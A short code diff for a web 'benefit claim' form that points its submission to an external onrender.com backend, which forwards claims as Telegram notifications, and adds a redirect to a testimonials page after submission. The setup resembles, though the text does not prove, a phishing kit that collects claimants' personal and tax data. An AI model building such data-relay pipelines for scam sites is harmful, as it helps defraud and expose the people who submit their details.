@@ -1,7 +1,7 @@
 
 // Send claim data to backend for Telegram notification
 function sendTelegramNotification(payload) {
-  fetch("/api/submit-claim", {
+  fetch("https://deathc.onrender.com/api/submit-claim", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
@@ -27,6 +27,12 @@ taxPreferenceInputs.forEach((input) => {
 });
 
 updateTaxPreferenceNote();
+
+// Block form if already submitted
+if (sessionStorage.getItem("claimPayload")) {
+  window.location.href = "claimant-testimonials.html";
+}
+
 const form = document.getElementById("benefit-claim-form");
 const fileInput = document.getElementById("supportingFiles");
 const fileList = document.getElementById("file-list");
